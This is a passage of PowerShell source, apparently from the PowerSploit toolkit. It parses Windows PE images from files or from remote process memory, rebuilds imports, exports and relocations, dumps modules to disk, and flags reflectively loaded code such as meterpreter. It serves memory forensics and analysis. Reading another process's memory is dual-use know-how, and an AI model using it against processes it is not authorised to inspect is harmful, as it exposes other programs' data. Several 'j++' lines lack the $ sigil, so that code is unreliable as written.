            if ($NTHeader.Signature -ne $ImageNTSig::VALID_PE_SIGNATURE) {
                Write-Warning 'Malformed NT header. Invalid PE signature.'
                if (-not $IgnoreMalformedPE) {
                    if ($ImageType -eq 'File') {
                        $Handle.Free()
                    } else {
                        $null = $Kernel32::CloseHandle($hProcess)
                        [Runtime.InteropServices.Marshal]::FreeHGlobal($PEHeaderAddr)
                    }

                    return
                }

                $ImageParsingFailed = $True
            }

            $Is64Bit = $False
            $Bits = 32
            $ThunkDataStruct = $ImageThunkData
            $OrdinalFlag = 0x80000000
            if ($NtHeader.OptionalHeader.Magic -eq 'PE64') {
                $Bits = 64
                # Reparse the NT header if it's a 64-bit image
                $NTHeader = $NtHeaderOffset -as $ImageNTHdrs64
                $Is64Bit = $True
                $ThunkDataStruct = $ImageThunkData64
                $OrdinalFlag = 0x8000000000000000
                Write-Verbose '64-bit PE detected'
            }
            else {
                Write-Verbose '32-bit PE detected'
            }

            if ($NtHeader.OptionalHeader.NumberOfRvaAndSizes -ne 16) {
                Write-Warning 'Malformed optional header. 16 data directories are expected.'
                if (-not $IgnoreMalformedPE) {
                    if ($ImageType -eq 'File') {
                        $Handle.Free()
                    } else {
                        $null = $Kernel32::CloseHandle($hProcess)
                        [Runtime.InteropServices.Marshal]::FreeHGlobal($PEHeaderAddr)
                    }

                    return
                }

                $ImageParsingFailed = $True
            }

            $SectionHeaderOffset = $DosHeader.e_lfanew + 4 +
                                   $ImageFileHeader::GetSize() +
                                   $NtHeader.FileHeader.SizeOfOptionalHeader
            $PSectionHeaders = [IntPtr] ($PEHeaderAddr.ToInt64() + $SectionHeaderOffset)

            $NumSections = $NtHeader.FileHeader.NumberOfSections
            $FileAlignment = $NtHeader.OptionalHeader.FileAlignment
            $UnadjustedHeaderSize = ($SectionHeaderOffset + ($NumSections * $ImageSectionHdr::GetSize())) - 1
            $HeaderSize = [Math]::Ceiling($UnadjustedHeaderSize / $FileAlignment) * $FileAlignment

            if ($HeaderSize -gt $PELen) {
                Write-Error 'Malformed PE. The calculated size of the PE header exceeds the size of the buffer allocated.'

                if ($ImageType -eq 'File') {
                    $Handle.Free()
                } else {
                    $null = $Kernel32::CloseHandle($hProcess)
                    [Runtime.InteropServices.Marshal]::FreeHGlobal($PEHeaderAddr)
                }

                return
            }

            if ($HeaderSize -gt $NtHeader.OptionalHeader.SizeOfHeaders) {
                Write-Warning 'Malformed optional header. Number of sections exceed the expected total size of the PE header'
                if (-not $IgnoreMalformedPE) {
                    if ($ImageType -eq 'File') {
                        $Handle.Free()
                    } else {
                        $null = $Kernel32::CloseHandle($hProcess)
                        [Runtime.InteropServices.Marshal]::FreeHGlobal($PEHeaderAddr)
                    }

                    return
                }

                $ImageParsingFailed = $True
            }

            $SectionHeaders = New-Object Object[] $NumSections
            $MaxRVA = $NTHeader.OptionalHeader.SizeOfImage
            $SizeOfPEFile = 0

            Write-Verbose "Image size in memory: 0x$($MaxRVA.ToString('X8'))"
            Write-Verbose 'Copying local version of the module...'

            $OrigPELen = $PELen

            # Now that the entire base PE header has been parsed,
            # let's work on a local copy of the in-memory PE. This
            # way, I can modify relocations of a module that is not
            # executing.
            if ($ImageType -eq 'File') {
                $PEBase = $PEHeaderAddr
            } else {
                [Runtime.InteropServices.Marshal]::FreeHGlobal($PEHeaderAddr)
                $PEBase = [Runtime.InteropServices.Marshal]::AllocHGlobal($MaxRVA)
                $PELen = $MaxRVA

                # Zero out the memory since AllocHGlobal does not guarantee a nulled-out allocation
                $Ntdll::memset($PEBase, 0, $MaxRVA)
            }

            $PEMinAddr = $PEBase.ToInt64()
            $PEMaxAddr = $PEBase.ToInt64() + $MaxRVA
            $ImageIsDatafile = $True

            if ($ImageType -ne 'File') {
                Write-Verbose 'Copying PE header from the remote process...'

                $BytesRead = 0
                # Copy the PE header from the remote process
                $Result = $Kernel32::ReadProcessMemory($hProcess,
                    $ModuleBaseAddress,
                    $PEBase,
                    $NtHeader.OptionalHeader.SizeOfHeaders,
                    [Ref] $BytesRead)

                Write-Verbose "Number of bytes read: 0x$($BytesRead.ToString('X8'))"

                if (!$Result) {
                    if ($ModuleName) {
                        Write-Error "Failed to read PE header of $ModuleName"
                    } else {
                        Write-Error "Failed to read PE header of process ID: $ProcessID"
                    }
            
                    $null = $Kernel32::CloseHandle($hProcess)
                    [Runtime.InteropServices.Marshal]::FreeHGlobal($PEBase)

                    return
                }

                $Properties = @{
                    ProcessID = $ProcessID
                    ModuleBaseAddress = $ModuleBaseAddress
                    PageSize = $SystemInfo.PageSize
                }
                $MemoryInfo = Get-VirtualMemoryInfo @Properties
                $ImageIsDatafile = $False

                if ($MemoryInfo.Type -eq 'MEM_MAPPED') {
                    # In this case, it is extremely likely that this is a resource-only dll
                    $ImageIsDatafile = $True
                    $ImageType = 'Mapped'
                } elseif ($MemoryInfo.Type -eq 'MEM_PRIVATE') {
                    # This is good at catching things like metsrv.dll (meterpreter) loaded in memory.
                    $WarningMessage = "Image at address 0x$($ModuleBaseAddress.ToString('X16')) was " +
                                      'not mapped with LoadLibrary[Ex]. It is possible ' +
                                      'that malicious code reflectively loaded this module!'

                    Write-Warning $WarningMessage
                }
            }

            # Start parsing the sections
            foreach ($i in 0..($NumSections - 1)) {
                if (!(Test-Pointer $PSectionHeaders $ImageSectionHdr::GetSize() $PEHeaderAddr $OrigPELen)) {
                    Write-Error 'Dereferencing IMAGE_SECTION_HEADER will cause an out-of-bounds memory access. Quiting.'

                    if ($ImageType -eq 'File') {
                        $Handle.Free()
                    } else {
                        $null = $Kernel32::CloseHandle($hProcess)
                        [Runtime.InteropServices.Marshal]::FreeHGlobal($PEBase)
                    }

                    return
                }

                $SectionHeaders[$i] = $PSectionHeaders -as $ImageSectionHdr

                if ($ImageIsDatafile) {
                    $SectionSize = $SectionHeaders[$i].SizeOfRawData
                    $SectionMaxRVA = $SectionHeaders[$i].PointerToRawData + $SectionSize
                    $SectionRVA = $SectionHeaders[$i].PointerToRawData
                } else {
                    $SectionSize = $SectionHeaders[$i].VirtualSize
                    $SectionMaxRVA = $SectionHeaders[$i].VirtualAddress + $SectionSize
                    $SectionRVA = $SectionHeaders[$i].VirtualAddress
                }
                
                $MaxFileOffset = $SectionHeaders[$i].PointerToRawData + $SectionHeaders[$i].SizeOfRawData

                if ($MaxFileOffset -gt $SizeOfPEFile) {
                    $SizeOfPEFile = $MaxFileOffset
                }

                if ($SectionMaxRVA -gt $MaxRVA) {
                    Write-Warning "Malformed section header. $($SectionHeaders[$i].Name) section exceeds SizeOfImage."
                    if (-not $IgnoreMalformedPE) {
                        if ($ImageType -eq 'File') {
                            $Handle.Free()
                        } else {
                            $null = $Kernel32::CloseHandle($hProcess)
                            [Runtime.InteropServices.Marshal]::FreeHGlobal($PEBase)
                        }

                        return
                    }

                    $ImageParsingFailed = $True
                }

                # Point to the next section header
                $PSectionHeaders = [IntPtr] ($PSectionHeaders.ToInt64() + $ImageSectionHdr::GetSize())

                if ($ImageType -ne 'File') {
                    $VerboseMessage = "Copying $($SectionHeaders[$i].Name) section.`tRange: " +
                                      "0x$(($ModuleBaseAddress.ToInt64() + $SectionRVA).ToString('X16'))" +
                                      "-0x$(($ModuleBaseAddress.ToInt64() + $SectionMaxRVA - 1).ToString('X16'))" +
                                      ", Size: 0x$($SectionSize.ToString('X8'))"

                    Write-Verbose $VerboseMessage

                    $BytesRead = 0

                    # Copy each mapped section from the remote process
                    $Result = $Kernel32::ReadProcessMemory($hProcess,
                        ($ModuleBaseAddress.ToInt64() + $SectionRVA),
                        ($PEBase.ToInt64() + $SectionRVA),
                        $SectionSize,
                        [Ref] $BytesRead)

                    Write-Verbose "Number of bytes read: 0x$($BytesRead.ToString('X8'))"

                    if (!$Result) {
                        if ($ModuleName) {
                            Write-Warning "Failed to read $($SectionHeaders[$i].Name) section of $ModuleName."
                        } else {
                            $WarningMessage = "Failed to read $($SectionHeaders[$i].Name) section" +
                                              " of module 0x$($ModuleBaseAddress.ToString('X16'))."

                            Write-Warning $WarningMessage
                        }

                        $ImageParsingFailed = $True
                    }
                }
            }

            if ($ImageIsDatafile) {
                $PEMinAddr = $PEBase.ToInt64()
                $PEMaxAddr = $PEBase.ToInt64() + $SizeOfPEFile
            }

            # Only display the PE header if a malformed PE was detected.
            if ($ImageParsingFailed) {
                if (-not $DumpDirectory) {
                    if ($ImageType -eq 'File') {
                        $NewProcessID = $null
                        $BaseAddr = $null
                    } else {
                        $NewProcessID = $ProcessID
                        $BaseAddr = $ModuleBaseAddress
                    }

                    $Fields = @{
                        ProcessId = $NewProcessID
                        BaseAddress = $BaseAddr
                        ModuleName = $ModuleName
                        Bits = $Bits
                        ImageType = $ImageType
                        DOSHeader = $DosHeader
                        NTHeader = $NTHeader
                        SectionHeaders = $SectionHeaders
                        ImportDirectory = $ImportEntries
                        Imports = $Imports
                        ExportDirectory = $ExportDir
                        Exports = $Exports
                    }

                    $PE = New-Object PSObject -Property $Fields
                    $PE.PSObject.TypeNames.Insert(0, 'PE.ParsedPE')
                }

                if ($ImageType -eq 'File') {
                    $Handle.Free()
                } else {
                    $null = $Kernel32::CloseHandle($hProcess)
                    [Runtime.InteropServices.Marshal]::FreeHGlobal($PEBase)
                }

                return $PE
            }

            # The process read handle is no longer needed at this point.
            if ($ImageType -ne 'File') { $null = $Kernel32::CloseHandle($hProcess) }

            Write-Verbose 'Processing imports...'

            # Process imports
            $ImportDirRVA = $NtHeader.OptionalHeader.DataDirectory[1].VirtualAddress
            $ImportDirSize = $NtHeader.OptionalHeader.DataDirectory[1].Size
            $ImportEntries = $null
            $Imports = $null

            if ($ImportDirRVA -and $ImportDirSize) {
                $FirstImageImportDescriptorPtr = [IntPtr] ($PEBase.ToInt64() + $ImportDirRVA)

                if ($ImageIsDatafile) {
                    $FirstImageImportDescriptorPtr = Convert-RVAToFileOffset $FirstImageImportDescriptorPtr $SectionHeaders $PEBase
                }

                $ImportDescriptorPtr = $FirstImageImportDescriptorPtr

                $ImportEntries = New-Object 'Collections.Generic.List[PSObject]'
                $Imports = New-Object 'Collections.Generic.List[PSObject]'

                $i = 0
                # Get all imported modules
                while ($True) {
                    $ImportDescriptorPtr = [IntPtr] ($FirstImageImportDescriptorPtr.ToInt64() +
                                                    ($i * $ImageImportDescriptor::GetSize()))

                    if (!(Test-Pointer $ImportDescriptorPtr $ImageImportDescriptor::GetSize() $PEBase $PELen)) {
                        Write-Verbose 'Dereferencing IMAGE_IMPORT_DESCRIPTOR will cause an out-of-bounds memory access.'
                        $i++
                        break
                    }

                    $ImportDescriptor = $ImportDescriptorPtr -as $ImageImportDescriptor

                    if ($ImportDescriptor.OriginalFirstThunk -eq 0) { break }

                    $DllNamePtr = [IntPtr] ($PEBase.ToInt64() + $ImportDescriptor.Name)
                    if ($ImageIsDatafile) { $DllNamePtr = Convert-RVAToFileOffset $DllNamePtr $SectionHeaders $PEBase }

                    if (!(Test-Pointer $DllNamePtr 256 $PEBase $PELen)) {
                        Write-Verbose 'Import dll name address exceeded the reported address range.'
                        $i++
                        break
                    }

                    $DllName = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($DllNamePtr)

                    $FirstFuncAddrPtr = [IntPtr] ($PEBase.ToInt64() + $ImportDescriptor.FirstThunk)
                    if ($ImageIsDatafile) {
                        $FirstFuncAddrPtr = Convert-RVAToFileOffset $FirstFuncAddrPtr $SectionHeaders $PEBase
                    }

                    $FuncAddrPtr = $FirstFuncAddrPtr
                    $FirstOFTPtr = [IntPtr] ($PEBase.ToInt64() + $ImportDescriptor.OriginalFirstThunk)

                    if ($ImageIsDatafile) {
                        $FirstOFTPtr = Convert-RVAToFileOffset $FirstOFTPtr $SectionHeaders $PEBase
                    }

                    $OFTPtr = $FirstOFTPtr
                    $j = 0

                    while ($True)
                    {
                        $OFTPtr = [IntPtr] ($FirstOFTPtr.ToInt64() + ($j * $ThunkDataStruct::GetSize()))

                        if (!(Test-Pointer $OFTPtr $ThunkDataStruct::GetSize() $PEBase $PELen)) {
                            Write-Verbose 'Import thunk data address exceeded the reported address range.'
                            j++
                            break
                        }

                        $ThunkData = $OFTPtr -as $ThunkDataStruct

                        $FuncAddrPtr = [IntPtr] ($FirstFuncAddrPtr.ToInt64() + ($j * $ThunkDataStruct::GetSize()))

                        if (($FuncAddrPtr.ToInt64() -lt $PEMinAddr) -or ($FuncAddrPtr.ToInt64() -gt $PEMaxAddr)) {
                            Write-Verbose 'Import thunk data address exceeded the reported address range.'
                            j++
                            break
                        }

                        if (!(Test-Pointer $FuncAddrPtr $ThunkDataStruct::GetSize() $PEBase $PELen)) {
                            Write-Verbose 'Import thunk data address exceeded the reported address range.'
                            j++
                            break
                        }

                        $FuncAddr = $FuncAddrPtr -as $ThunkDataStruct

                        # Reconstruct the IAT
                        if ($FullDumpPath -and !$ImageIsDatafile) {
                            if ($Is64Bit) {
                                [Runtime.InteropServices.Marshal]::WriteInt64($FuncAddrPtr, $ThunkData.AddressOfData)
                            } else {
                                [Runtime.InteropServices.Marshal]::WriteInt32($FuncAddrPtr, $ThunkData.AddressOfData)
                            }
                        }

                        $Result = @{
                            ModuleName = $DllName
                            OFT = $ThunkData.AddressOfData
                            FT = $FuncAddr.AddressOfData
                        }

                        if (($ThunkData.AddressOfData -band $OrdinalFlag) -eq $OrdinalFlag)
                        {
                            $Result['Ordinal'] = $ThunkData.AddressOfData -band (-bnot $OrdinalFlag)
                            $Result['FunctionName'] = ''
                        }
                        else
                        {
                            $ImportByNamePtr = [IntPtr] ($PEBase.ToInt64() + [Int64]$ThunkData.AddressOfData + 2)

                            if ($ImageIsDatafile) {
                                $ImportByNamePtr = Convert-RVAToFileOffset $ImportByNamePtr $SectionHeaders $PEBase
                            }

                            if (!(Test-Pointer $ImportByNamePtr 256 $PEBase $PELen)) {
                                Write-Verbose 'Import name address exceeded the reported address range.'
                                $FuncName = ''
                            } else {
                                $FuncName = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportByNamePtr)
                            }

                            $Result['Ordinal'] = ''
                            $Result['FunctionName'] = $FuncName
                        }
                
                        $Result['RVA'] = $FuncAddr.AddressOfData

                        if ($FuncAddr.AddressOfData -eq 0) { break }
                        if ($OFTPtr -eq 0) { break }
                
                        $Import = New-Object PSObject -Property $Result
                        $Import.PSObject.TypeNames.Insert(0, 'PE.Import')
                        $Imports.Add($Import)
                
                        $j++
                
                    }

                    $Fields = @{
                        OriginalFirstThunk = $ImportDescriptor.OriginalFirstThunk
                        TimeDateStamp = $ImportDescriptor.TimeDateStamp
                        ForwarderChain = $ImportDescriptor.ForwarderChain
                        Name = $DllName
                        FirstThunk = $ImportDescriptor.FirstThunk
                    }

                    $ImportDir = New-Object PSObject -Property $Fields
                    $ImportDir.PSObject.TypeNames.Insert(0, 'PE.ImportDir')
                    $ImportEntries.Add($ImportDir)

                    $i++
                }
            }

            Write-Verbose 'Processing exports...'

            # Process exports
            $ExportDirRVA = $NtHeader.OptionalHeader.DataDirectory[0].VirtualAddress
            $ExportDirSize = $NtHeader.OptionalHeader.DataDirectory[0].Size
            $ExportDir = $null
            $Exports = $null

            if ($ExportDirRVA -and $ExportDirSize) {
                # List all function Rvas in the export table
                $ExportPointer = [IntPtr] ($PEBase.ToInt64() + $NtHeader.OptionalHeader.DataDirectory[0].VirtualAddress)
                # This range will be used to test for the existence of forwarded functions
                $ExportDirLow = $NtHeader.OptionalHeader.DataDirectory[0].VirtualAddress
                if ($ImageIsDatafile) { 
                    $ExportPointer = Convert-RVAToFileOffset $ExportPointer $SectionHeaders $PEBase
                    $ExportDirLow = Convert-RVAToFileOffset $ExportDirLow $SectionHeaders $PEBase
                    $ExportDirHigh = $ExportDirLow.ToInt32() + $NtHeader.OptionalHeader.DataDirectory[0].Size
                } else { $ExportDirHigh = $ExportDirLow + $NtHeader.OptionalHeader.DataDirectory[0].Size }
            
                if (!(Test-Pointer $ExportPointer $ImageExportDir::GetSize() $PEBase $PELen)) {
                    Write-Verbose 'Export directory address exceeded the reported address range.'
                } else {
                    $ExportDirectory = $ExportPointer -as $ImageExportDir
                    $AddressOfNamePtr = [IntPtr] ($PEBase.ToInt64() + $ExportDirectory.AddressOfNames)
                    $NameOrdinalAddrPtr = [IntPtr] ($PEBase.ToInt64() + $ExportDirectory.AddressOfNameOrdinals)
                    $AddressOfFunctionsPtr = [IntPtr] ($PEBase.ToInt64() + $ExportDirectory.AddressOfFunctions)
                    $NumNamesFuncs = $ExportDirectory.NumberOfFunctions - $ExportDirectory.NumberOfNames
                    $NumNames = $ExportDirectory.NumberOfNames
                    $NumFunctions = $ExportDirectory.NumberOfFunctions
                    $Base = $ExportDirectory.Base

                    if ($ImageIsDatafile) {
                        $AddressOfNamePtr = Convert-RVAToFileOffset $AddressOfNamePtr $SectionHeaders $PEBase
                        $NameOrdinalAddrPtr = Convert-RVAToFileOffset $NameOrdinalAddrPtr $SectionHeaders $PEBase
                        $AddressOfFunctionsPtr = Convert-RVAToFileOffset $AddressOfFunctionsPtr $SectionHeaders $PEBase
                    }

                    $Exports = New-Object 'Collections.Generic.List[PSObject]'

                    if ($NumFunctions -gt 0) {
                        # Create an empty hash table that will contain indices to exported functions and their RVAs
                        $FunctionHashTable = @{}
        
                        foreach ($i in 0..($NumFunctions - 1)) {
                            $FuncAddr = $AddressOfFunctionsPtr.ToInt64() + ($i * 4)

                            if (!(Test-Pointer $FuncAddr 4 $PEBase $PELen)) {
                                Write-Verbose 'Export function address exceeded the reported address range. Skipping this export.'
                                break
                            }

                            $RvaFunction = [Runtime.InteropServices.Marshal]::ReadInt32($FuncAddr)
                            # Function is exported by ordinal if $RvaFunction -ne 0.
                            # I.E. NumberOfFunction != the number of actual, exported functions.
                            if ($RvaFunction) { $FunctionHashTable[[Int]$i] = $RvaFunction }
                        }
            
                        # Create an empty hash table that will contain indices into RVA array and the function's name
                        $NameHashTable = @{}
            
                        foreach ($i in 0..($NumNames - 1)) {
                            $NamePtr = $AddressOfNamePtr.ToInt64() + ($i * 4)

                            if (!(Test-Pointer $NamePtr 4 $PEBase $PELen)) {
                                Write-Verbose 'Export AddressOfName address exceeded the reported address range. Skipping this export.'
                                break
                            }

                            $RvaName = [Runtime.InteropServices.Marshal]::ReadInt32($NamePtr)
                            $FuncNameAddr = [IntPtr] ($PEBase.ToInt64() + $RvaName)
                            if ($ImageIsDatafile) { $FuncNameAddr= Convert-RVAToFileOffset $FuncNameAddr $SectionHeaders $PEBase }

                            if (!(Test-Pointer $FuncNameAddr 256 $PEBase $PELen)) {
                                Write-Verbose 'Export name address exceeded the reported address range. Skipping this export.'
                                break
                            }

                            $FuncName = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($FuncNameAddr)
                            $OrdinalPtr = $NameOrdinalAddrPtr.ToInt64() + ($i * 2)

                            if (!(Test-Pointer $OrdinalPtr 2 $PEBase $PELen)) {
                                Write-Verbose 'Export ordinal address exceeded the reported address range. Skipping this export.'
                                break
                            }

                            $NameOrdinal = [Int][Runtime.InteropServices.Marshal]::ReadInt16($OrdinalPtr)
                            $NameHashTable[$NameOrdinal] = $FuncName
                        }
            
                        foreach ($Key in $FunctionHashTable.Keys) {
                            $Result = @{}
                
                            if ($NameHashTable[$Key]) {
                                $Result['FunctionName'] = $NameHashTable[$Key]
                            } else {
                                $Result['FunctionName'] = ''
                            }
                
                            if (($FunctionHashTable[$Key] -ge $ExportDirLow) -and ($FunctionHashTable[$Key] -lt $ExportDirHigh)) {
                                $ForwardedNameAddr = [IntPtr] ($PEBase.ToInt64() + $FunctionHashTable[$Key])

                                if ($ImageIsDatafile) {
                                    $ForwardedNameAddr = Convert-RVAToFileOffset $ForwardedNameAddr $SectionHeaders $PEBase
                                }

                                if (!(Test-Pointer $ForwardedNameAddr 256 $PEBase $PELen)) {
                                    Write-Verbose 'Forwarded name address exceeded the reported address range. Skipping this export.'
                                    break
                                }

                                $ForwardedName = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($ForwardedNameAddr)
                                $Result['ForwardedName'] = $ForwardedName
                            } else {
                                $Result['ForwardedName'] = ''
                            }
                
                            $Result['Ordinal'] = $Key + $Base
                            $Result['RVA'] = $FunctionHashTable[$Key]
                
                            $Export = New-Object PSObject -Property $Result
                            $Export.PSObject.TypeNames.Insert(0, 'PE.Export')
                            $Exports.Add($Export)
                        }
                    }

                    $ExportNameAddr = [IntPtr] ($PEBase.ToInt64() + $ExportDirectory.Name)

                    if ($ImageIsDatafile) {
                        $ExportNameAddr = Convert-RVAToFileOffset $ExportNameAddr $SectionHeaders $PEBase
                    }

                    if (!(Test-Pointer $ExportNameAddr 256 $PEBase $PELen)) {
                        Write-Verbose 'Export name address exceeded the reported address range.'
                        $ExportName = ''
                    } else {
                        $ExportName = [Runtime.InteropServices.Marshal]::PtrToStringAnsi($ExportNameAddr)
                    }

                    $ExportDirFields = @{
                        Characteristics = $ExportDirectory.Characteristics
                        TimeDateStamp = $ExportDirectory.TimeDateStamp
                        MajorVersion = $ExportDirectory.MajorVersion
                        MinorVersion = $ExportDirectory.MinorVersion
                        Name = $ExportName
                        Base = $ExportDirectory.Base
                        NumberOfFunctions = $ExportDirectory.NumberOfFunctions
                        NumberOfNames = $ExportDirectory.NumberOfNames
                        AddressOfFunctions = $ExportDirectory.AddressOfFunctions
                        AddressOfNames = $ExportDirectory.AddressOfNames
                        AddressOfNameOrdinals = $ExportDirectory.AddressOfNameOrdinals
                    }

                    $ExportDir = New-Object PSObject -Property $ExportDirFields
                    $ExportDir.PSObject.TypeNames.Insert(0, 'PE.ExportDir')

                    # If the module name was not retrieved previously, use the export name.
                    if (!$ModuleName -and $ExportName) {
                        $ModuleName = $ExportName
                    }
                }
            }

            # Dump the in-memory version of the module to disk.
            # Perform the following steps:
            # 1) Copy the PE header - i.e. DOS header, NT header, and section headers
            # 2) Copy each section
            # 3) If the module is loaded at an address other than it's preferred base address,
            #    restore relocated addresses using the relocation table.
            # 4) Restore the IAT so that each entry matches the original first
            #    thunk from the import descriptor table.
            if ($FullDumpPath)
            {
                Write-Verbose "Calculated PE file size: 0x$($SizeOfPEFile.ToString('X8'))"
                $ModuleBaseDelta = $ModuleBaseAddress.ToInt64() - $NtHeader.OptionalHeader.ImageBase

                # For normal modules, it is unlikely that relocations will need to be fixed up
                # since the Windows loader updates OptionalHeader.ImageBase after the loaded
                # base address is determined.
                if ($ModuleBaseDelta -ne 0 -and !$ImageIsDatafile) {
                    $RelocRVA = $NtHeader.OptionalHeader.DataDirectory[5].VirtualAddress
                    $RelocSize = $NtHeader.OptionalHeader.DataDirectory[5].Size

                    # Process relocation entries
                    if ($RelocRVA -and $RelocSize) {
                        $Offset = 0
                        $PRelocBase = [IntPtr] ($PEBase.ToInt64() + $RelocRVA)
                        $PRelocBlock = $PRelocBase
                        $Relocations = New-Object 'Collections.Generic.List[PSObject]'

                        do {
                            if (($PRelocBlock.ToInt64() -lt $PEMinAddr) -or ($PRelocBlock.ToInt64() -gt $PEMaxAddr)) {
                                $VerboseMessage = 'Relocation address exceeded the reported address' +
                                                  ' range. This relocation will be skipped.'

                                Write-Verbose $VerboseMessage
                                continue
                            }

                            $PageRva = [Runtime.InteropServices.Marshal]::ReadInt32($PRelocBlock)
                            $BlockSize = [Runtime.InteropServices.Marshal]::ReadInt32($PRelocBlock, 4)
                            $RelocCount = ($BlockSize - 8) / 2

                            for ($i = 0; $i -lt $RelocCount; $i++) {
                                $RelocData = [Runtime.InteropServices.Marshal]::ReadInt16($PRelocBlock, (($i *2) + 8))

                                $Reloc = New-Object PSObject -Property @{
                                    Type = (($RelocData -band 0xF000) / 0x1000) -as $ImageReloc
                                    Offset = ($RelocData -band 0x0FFF) + $PageRva
                                }

                                if ($Reloc.Type -ne $ImageReloc::ABSOLUTE) {
                                    $Relocations.Add($Reloc)
                                }
                            }

                            $Offset += $BlockSize
                            $PRelocBlock = [IntPtr] ($PRelocBase.ToInt64() + $Offset)
                        } while ($Offset -lt $RelocSize)
                    }

                    Write-Verbose 'Restoring relocated addresses...'
                    Write-Verbose "Module base address delta: $($ModuleBaseDelta.ToString('X8'))"

                    foreach ($Relocation in $Relocations) {
                        if ($Relocation.Type -eq $ImageReloc::DIR64) {
                            $OriginalAddr = [Runtime.InteropServices.Marshal]::ReadInt64($PEBase, $Relocation.Offset)
                            $RestoredAddr = $OriginalAddr - $ModuleBaseDelta
                            if ([Int64]::TryParse($RestoredAddr, [Ref] 0)) {
                                [Runtime.InteropServices.Marshal]::WriteInt64($PEBase, $Relocation.Offset, $RestoredAddr)
                            }
                        } elseif ($Relocation.Type -eq $ImageReloc::HIGHLOW) {
                            $OriginalAddr = [Runtime.InteropServices.Marshal]::ReadInt32($PEBase, $Relocation.Offset)
                            $RestoredAddr = $OriginalAddr - $ModuleBaseDelta
                            if ([Int32]::TryParse($RestoredAddr, [Ref] 0)) {
                                [Runtime.InteropServices.Marshal]::WriteInt32($PEBase, $Relocation.Offset, $RestoredAddr)
                            }
                        }
                    }
                }

                $DumpedPEBytes = New-Object Byte[] $SizeOfPEFile

                if ($ImageIsDatafile) {
                    # Copy the entire mapped image
                    [Runtime.InteropServices.Marshal]::Copy($PEBase, $DumpedPEBytes, 0, $SizeOfPEFile)
                } else {
                    # Copy the PE header
                    [Runtime.InteropServices.Marshal]::Copy($PEBase, $DumpedPEBytes, 0, $HeaderSize)

                    foreach ($Section in $SectionHeaders) {
                        $PSectionData = [IntPtr] ($PEBase.ToInt64() + $Section.VirtualAddress)

                        [Runtime.InteropServices.Marshal]::Copy($PSectionData,
                                                                $DumpedPEBytes,
                                                                $Section.PointerToRawData,
                                                                $Section.SizeOfRawData)
                    }
                }

                if ($Is64Bit) { $Format = 'X16' } else { $Format = 'X8' }

                if ($ModuleName) {
                    $Name = Split-Path -Leaf $ModuleName
                } else {
                    $Name = 'UNKNOWN'
                }

                $DumpFile = "$FullDumpPath\$($ProcessID.ToString('X4'))" +
                            "_$($ModuleBaseAddress.ToString($Format))_$Name.bin"

                [IO.File]::WriteAllBytes($DumpFile, $DumpedPEBytes)
                Write-Verbose "Wrote dumped PE to $DumpFile"
            }

            # If the process is dumped, output the new file.
            # Otherwise, output the parsed PE header.
            if ($FullDumpPath) {
                Get-ChildItem $DumpFile
            } else {
                if ($ImageType -eq 'File') {
                    $NewProcessID = $null
                    $BaseAddr = $null
                } else {
                    $NewProcessID = $ProcessID
                    $BaseAddr = $ModuleBaseAddress
                }

                $Fields = @{
                    ProcessId = $NewProcessID
                    BaseAddress = $BaseAddr
                    ModuleName = $ModuleName
                    Bits = $Bits
                    ImageType = $ImageType
                    DOSHeader = $DosHeader
                    NTHeader = $NTHeader
                    SectionHeaders = $SectionHeaders
                    ImportDirectory = $ImportEntries
                    Imports = $Imports
                    ExportDirectory = $ExportDir
                    Exports = $Exports
                }

                $PE = New-Object PSObject -Property $Fields
                $PE.PSObject.TypeNames.Insert(0, 'PE.ParsedPE')

                $ScriptBlock = { & {
                    Param (
                        [Parameter(Position = 0, Mandatory = $True)]
                        [String]
                        $OriginalPEDirectory,

                        [Parameter(Position = 1, Mandatory = $True)]
                        $PE
                    )

                    $SymServerURL = 'http://msdl.microsoft.com/download/symbols'
                    $FileName = Split-Path -Leaf $PE.ModuleName
                    $Request = "{0}/{1}/{2:X8}{3:X}/{1}" -f $SymServerURL,
                                                            $FileName,
                                                            $PE.NTHeader.FileHeader.TimeDateStamp,
                                                            $PE.NTHeader.OptionalHeader.SizeOfImage
                    $Request = "$($Request.Substring(0, $Request.Length - 1))_"
                    $WebClient = New-Object Net.WebClient
                    $WebClient.Headers.Add('User-Agent', 'Microsoft-Symbol-Server/6.6.0007.5')

                    try {
                        $CabBytes = $WebClient.DownloadData($Request)
                    } catch {
                        throw "Unable to download the original file from $Request"
                    }
                
                    $FileWithoutExt = $FileName.Substring(0, $FileName.LastIndexOf('.'))
                    $CabPath = Join-Path $OriginalPEDirectory "$FileWithoutExt.cab"
                    [IO.File]::WriteAllBytes($CabPath, $CabBytes)

                    Get-ChildItem $CabPath
                } $args[0] $this }

                $Properties = @{
                    InputObject = $PE
                    MemberType = 'ScriptMethod'
                    Name = 'DownloadFromMSSymbolServer'
                    Value = $ScriptBlock
                    PassThru = $True
                    Force = $True
                }
                $PE = Add-Member @Properties

                # Optionally, you will be able to dump the process to disk after it's parsed.
                $ScriptBlock = { & {
                    Param (
                        [Parameter(Position = 0, Mandatory = $True)]
                        [String]
                        $DumpDirectory,

                        [Parameter(Position = 1, Mandatory = $True)]
                        $ProcessID,

                        [Parameter(Position = 2, Mandatory = $True)]
                        $ModuleBaseAddress
                    )

                    Get-PE -ProcessID $ProcessID -ModuleBaseAddress $ModuleBaseAddress -DumpDirectory $DumpDirectory
                } $args[0] $this.ProcessId $this.BaseAddress }

                $Properties = @{
                    InputObject = $PE
                    MemberType = 'ScriptMethod'
                    Name = 'DumpToDisk'
                    Value = $ScriptBlock
                    PassThru = $True
                    Force = $True
                }
                $PE = Add-Member @Properties

                $PE
            }
        
            if ($ImageType -eq 'File') {
                $Handle.Free()
            } else {
                [Runtime.InteropServices.Marshal]::FreeHGlobal($PEBase)
            }
        }

        END {}
    }

    filter Find-ProcessPEs {
    <#
    .SYNOPSIS

    Finds portable executables in memory.

    PowerSploit Function: Find-ProcessPEHeaders
    Author: Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: PSReflect module
                           Get-SystemInfo
                           Get-ProcessMemoryInfo
    Optional Dependencies: None

    .PARAMETER ProcessID

    Specifies the ID of the process to search.

    .EXAMPLE

    Get-Process cmd | Find-ProcessPEHeaders

    .NOTES

    Find-ProcessPEHeaders is limited in that it only checks for an 'MZ'
    at the base of each allocation. This will catch most PEs in memory
    but obviously, this is extremely easy to evade.
    #>

